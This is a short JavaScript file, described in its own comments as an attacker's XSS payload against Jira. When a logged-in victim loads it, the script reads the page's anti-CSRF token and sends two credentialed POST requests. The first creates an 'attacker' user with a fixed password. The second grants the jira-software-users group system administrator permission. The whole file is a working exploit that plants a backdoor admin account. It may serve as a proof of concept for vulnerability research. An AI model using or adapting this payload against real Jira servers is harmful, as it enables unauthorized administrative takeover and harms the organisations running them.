// Attacker create this XSSS.Js file to do tow action 
// function to create new Attacker user in Jira with jira-soft-User role

function loadDoc1() {
    const tokens = document.getElementById('atlassian-token');
    const atl_tokens2 = tokens.getAttribute('content');
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://updatelap:1234/secure/admin/user/AddUser.jspa", true)
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.withCredentials = true;
    xhttp.send('email=attacker%40email.com&fullname=attacker&username=attacker&directoryId=1&password=1234&selectedApplications=jira-software&Create=Create+user&atl_token='+atl_tokens2+'');
}
window.onload = loadDoc1();

// function 2 to set jira-soft-user as admin on globla perms. 

function loadDoc2() {
    const tokens = document.getElementById('atlassian-token');
    const atl_tokens2 = tokens.getAttribute('content');
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://updatelap:1234/secure/admin/GlobalPermissions.jspa", true)
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.withCredentials = true;
    xhttp.send('globalPermType=SYSTEM_ADMIN&groupName=jira-software-users&action=add&Add=Add&atl_token='+atl_tokens2+'');
}

window.onload = loadDoc2();
